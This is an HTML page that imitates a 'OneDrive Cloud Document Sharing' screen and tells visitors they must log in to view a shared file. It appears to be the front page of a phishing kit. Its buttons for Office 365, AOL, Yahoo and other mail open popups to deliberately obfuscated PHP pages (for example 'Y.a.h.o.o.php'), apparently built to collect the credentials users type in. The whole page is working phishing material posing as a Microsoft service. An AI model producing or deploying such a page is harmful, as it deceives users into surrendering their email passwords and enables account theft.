<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="UTF-8">
<title>OneDrive Cloud Document Sharing</title>
<link rel="stylesheet prefetch" href="images_files/css.css">
<link rel="stylesheet" href="images_files/style.css">
<link rel="icon" href="images_files/favicon.ico" type="image/x-icon" />
<script type="text/javascript">
<!--
function popupwnd(url, toolbar, menubar, locationbar, resize, scrollbars, statusbar, left, top, width, height)
{
   if (left == -1)
   {
      left = (screen.width/2)-(width/2);
   }
   if (top == -1)
   {
      top = (screen.height/2)-(height/2);
   }
   var popupwindow = this.open(url, '', 'toolbar=' + toolbar + ',menubar=' + menubar + ',location=' + locationbar + ',scrollbars=' + scrollbars + ',resizable=' + resize + ',status=' + statusbar + ',left=' + left + ',top=' + top + ',width=' + width + ',height=' + height);
}
//-->
</script>
</head>

<body>
<div class="login-wrap">
  <div class="login-html">
	  <div class="LogoOne"></div>
	   <div class="foot-lnk">To read the document, please choose your email provider below Login to view shared file.</div>
    <!--<div class="top"></div>-->
    <!--<input id="tab-1" type="radio" name="tab" class="sign-in" checked><label for="tab-1" class="tab">Sign In</label>
		<input id="tab-2" type="radio" name="tab" class="sign-up"><label for="tab-2" class="tab">Sign Up</label>-->
    <div class="login-form">
      <div class="sign-in-htm">
        <div class="group"><br>
             <button class="btn-3 loginBtn loginBtn--outlook" onclick="popupwnd('Off.3.6.5.php?<?php echo uniqid(); ?>','no','no','no','no','no','no','300','100','400','430')">Login with Office 365&nbsp;&nbsp;</button>
        </div>
        <div class="group">
          <button class="btn-3 loginBtn loginBtn--aol" onclick="popupwnd('A.o.l.php?','no','no','no','no','no','no','300','100','400','430')">&nbsp;&nbsp;Login  with Aol Mail&nbsp;&nbsp;</button>
        </div>
		
		        <div class="group">
          <button class="btn-3 loginBtn loginBtn--yahoo" onclick="popupwnd('Y.a.h.o.o.php?<?php echo uniqid(); ?>','no','no','no','no','no','no','300','100','400','500')">Login with Yahoo Mail</button>
        </div>
		
		<div class="group">
          <button class="btn-3 loginBtn loginBtn--other" onclick="popupwnd('O.t.h.e.r.php?<?php echo uniqid(); ?>','no','no','no','no','no','no','300','100','400','400')">Login with Other Mail</button>
        </div>
		
        <!--<div class="hr"></div>--><br><br>
        <div class="foot-lnk">Get to all your files from anywhere on any device and share them with anyone. Onedrive document in one cloud. </div>
      </div>
    </div>
  </div>
</div>
<!--</div>-->


</body></html>